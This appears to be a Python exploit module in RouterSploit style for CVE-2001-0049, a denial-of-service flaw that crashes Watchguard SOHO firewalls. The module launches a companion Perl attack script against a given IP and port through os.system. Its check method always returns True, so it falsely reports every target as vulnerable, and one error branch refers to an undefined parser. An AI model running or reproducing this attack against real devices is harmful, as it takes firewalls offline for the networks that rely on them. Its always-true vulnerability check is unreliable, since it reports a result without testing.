



import sys,os

from routersploit.core.exploit import *

from routersploit.core.http.http_client import HTTPClient

from ctypes import *



class Exploit(HTTPClient):



    __info__ = {

        "name": "CVE-2001-0049",

        "description": "You can also connect to the Watchguard SOHO through your "
                       "browser and press F5 like a maniac on speed to get the "
                       "firewall crashing. So, either you run the .pl script or "
                       " you fire up your webbrowser... Either way, it works.",

        "authors": (

            "###",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "",

        ),

        "devices": (

            "Watchguard, CVE-2001-0049"
        ),
    }


    target = OptIP("", "your_watchguard_ip IPv4 or IPv6 address")
    port = OptPort(80, "your_watchguard_port")
    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = 'perl {} {} {}'.format('CVE-2001-0049.pl',self.target,self.port)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            parser.print_help(sys.stderr)

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True